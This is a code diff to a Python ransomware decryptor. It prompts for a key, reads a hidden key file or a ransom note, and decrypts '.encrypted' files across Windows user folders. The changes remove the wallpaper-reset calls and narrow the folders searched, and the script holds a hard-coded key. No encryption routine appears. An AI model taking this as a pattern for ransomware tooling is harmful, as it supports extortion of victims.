@@ -1,7 +1,6 @@
 import os
 import base64
 import re
-import ctypes
 
 DECRYPT_KEY = "agent77"
 
@@ -20,18 +19,17 @@ def decrypt_file(file_path, key, iv):
     except:
         return False
 
-def get_dirs():
-    user = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
-    return [p for p in [user+'\\Desktop', user+'\\Documents', user+'\\Downloads', user+'\\Pictures', user+'\\Music', user+'\\Videos', user+'\\AppData\\Local', user+'\\AppData\\Roaming', 'C:\\ProgramData', 'C:\\Users\\Public\\Documents'] if os.path.exists(p)]
-
 def decrypt_all(key, iv):
     count = 0
-    for d in get_dirs():
-        for root,_,files in os.walk(d):
-            for f in files:
-                if f.endswith('.encrypted'):
-                    if decrypt_file(os.path.join(root,f), key, iv):
-                        count += 1
+    user = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
+    dirs = [user+'\\Desktop', user+'\\Documents', user+'\\Downloads', user+'\\Pictures', user+'\\Music', user+'\\Videos']
+    for d in dirs:
+        if os.path.exists(d):
+            for root,_,files in os.walk(d):
+                for f in files:
+                    if f.endswith('.encrypted'):
+                        if decrypt_file(os.path.join(root,f), key, iv):
+                            count += 1
     return count
 
 key_input = input("Enter decryption key: ").strip()
@@ -51,8 +49,6 @@ if os.path.exists(hidden):
             print(f"Decrypted {count} files")
             try: os.remove(hidden)
             except: pass
-            try: ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
-            except: pass
             exit()
 
 # Try ransom note
@@ -68,8 +64,6 @@ if os.path.exists(note):
             count = decrypt_all(key, iv)
             print(f"Decrypted {count} files")
             try: os.remove(note)
-            except: pass
-            try: ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
             except: pass
             exit()
 
